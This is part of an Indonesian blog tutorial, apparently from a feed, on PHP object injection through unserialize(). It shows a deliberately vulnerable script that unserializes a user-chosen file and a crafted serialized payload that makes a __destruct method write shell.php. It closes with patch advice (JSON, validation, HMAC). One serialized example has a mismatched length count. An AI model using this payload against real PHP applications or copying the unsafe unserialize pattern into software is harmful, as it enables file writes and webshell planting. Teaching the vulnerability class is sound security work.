  &lt;li&gt;&lt;code&gt;i:2;&lt;/code&gt;          : Integer, Index ke [2]&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;s:4:&quot;NICE&quot;}&lt;/code&gt;   : String, 4 karakter, Value “NICE”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Kira-kira seperti itu penjabaran dari serialize nya.&lt;/p&gt;

&lt;h2 id=&quot;unserialize&quot;&gt;Unserialize()&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;mixed unserialize ( string $str [, array $options ] )&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://php.net/manual/en/function.unserialize.php&quot;&gt;unserialize()&lt;/a&gt;  takes a single serialized variable and converts it back into a PHP value.&lt;/em&gt;
Jadi unserialize melakukan konversi dari serialize object kedalam kode PHP kembali.&lt;/p&gt;

&lt;p&gt;selain menggunakan json sebagai standar pertukaran data Saran lain dari dokumentasi 
php.net adalah untuk menggunakan &lt;a href=&quot;http://php.net/manual/en/function.hash-hmac.php&quot;&gt;hmac&lt;/a&gt;
untuk melakukan validasi dan menjaga data tidak ada yang memodifikasi selain dari yang di tentukan server.&lt;/p&gt;

&lt;p&gt;Note : $options parameter baru ada di changelog php 7.0.0&lt;/p&gt;

&lt;h4 id=&quot;contoh-1&quot;&gt;Contoh&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
$value='a:1:{s:4:&quot;Test&quot;;s:17:&quot;Unserializationhere!&quot;;}'
unserialize($value);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;php-autoloading&quot;&gt;PHP Autoloading&lt;/h2&gt;

&lt;p&gt;Dalam php kita bisa mendifinisikan special function yang bisa di exsekusi secara otomatis
jadi untuk menjalankannya tidak perlu panggil fungsinya lagi biasanya disebut dengan php magic function atau magic method
php juga mempunyai beberapa magic method seperti __construct/__destruct.&lt;/p&gt;

&lt;p&gt;Contoh beberapa magic function di php : __construct(), __destruct(), __call(), __callSt
atic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone(), and __autoload().&lt;/p&gt;

&lt;p&gt;Ref: http://www.programmerinterview.com/index.php/php-questions/php-what-are-magic-functions/&lt;/p&gt;

&lt;h2 id=&quot;object-instantiation&quot;&gt;Object Instantiation&lt;/h2&gt;

&lt;p&gt;Instantiation adalah ketika class menjadi objek saat kita buat instance dari class tersebut
contohnya ketika kita buat &lt;code&gt;new namaClass()&lt;/code&gt; , namaClass() jadi instantiated object&lt;/p&gt;

&lt;h2 id=&quot;exploit-the-vulnerable-code&quot;&gt;Exploit the vulnerable code&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php

class foo {
	public $file = &quot;text.txt&quot;;
	public $data = &quot;stringnya&quot;;

	// php magic function
	function __destruct(){
		file_put_contents($this-&amp;gt;file, $this-&amp;gt;data);
	}
}

$file_name = $_GET['session_filename'];

print &quot;Readfile &quot; . $file_name . &quot;&amp;lt;br&amp;gt;&quot;;
if(!file_exists($file_name)){
	print &quot;no file\n&quot;;
}else{
	unserialize(file_get_contents($file_name));
}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;pertama kita lihat apakah class yang vulnerable memanggil magic function dari php, 
jika iya berarti kita mungkin untuk mengubah flow dari applikasi tersebut.&lt;/p&gt;

&lt;p&gt;code vulnerable di atas memanggil &lt;code&gt;__destruct()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
class foo {
	public $file = &quot;text.txt&quot;;
	public $data = &quot;stringnya&quot;;

	// php magic function
	function __destruct(){
		file_put_contents($this-&amp;gt;file, $this-&amp;gt;data);
	}
}

&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;racik-payload&quot;&gt;Racik payload&lt;/h4&gt;

&lt;p&gt;&lt;code&gt;O:3:%22foo%22:2:{s:4:%22file%22;s:9:%22shell.php%22;s:4:%22data%22;s:5:%22aaaa%22;}&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;O:3:&lt;/code&gt;                            : Object, terima 3 parameter&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;&quot;foo&quot;:2:{&lt;/code&gt;                       : Parameter foo terima 2 value&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;s:4:&quot;file&quot;;s:9:&quot;shell.php&quot;;&lt;/code&gt;     : String, 4 karakter “file”,String 9 karakter “shell.php”&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;s:4:&quot;data&quot;;s:5:&quot;aaaa&quot;;}&lt;/code&gt;         : String, 4 karakter “data”,String 5 karakter “aaaaa”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ketika input string kita di unserialized maka kita dapat mengontrol properti dar class “foo”.
Di dalam magic method __destruct maka akan menggunakan
value yang sudah kita kontrol dan akan membuat file shell.php dengan isi “aaaaa”.&lt;/p&gt;

&lt;h2 id=&quot;patch-the-vulnerable-code&quot;&gt;Patch the vulnerable code&lt;/h2&gt;

&lt;p&gt;Lakukan validasi terhadap user input. dan gunakan json untuk pertukaran data.
bila memang harus menggunakan external serialize bisa juga tambahkan validasi dengan hmac()
atau lain sebagainya agar tidak ada input yang bisa mengexploitasi sistem.&lt;/p&gt;

&lt;p&gt;References :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://www.notsosecure.com/remote-code-execution-via-php-unserialize/&lt;/li&gt;
  &lt;li&gt;https://securitycafe.ro/2015/01/05/understanding-php-object-injection/&lt;/li&gt;
  &lt;li&gt;http://www.inulledmyself.com/2015/02/exploiting-memory-corruption-bugs-in.html&lt;/li&gt;
  &lt;li&gt;https://www.owasp.org/index.php/PHP_Object_Injection&lt;/li&gt;
&lt;/ul&gt;

  
  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/web%20exploitation/php-object-injection&quot;&gt;PHP Object Injection Via Unserialize&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on October 01, 2016.&lt;/p&gt;</content>
</entry>


</feed>
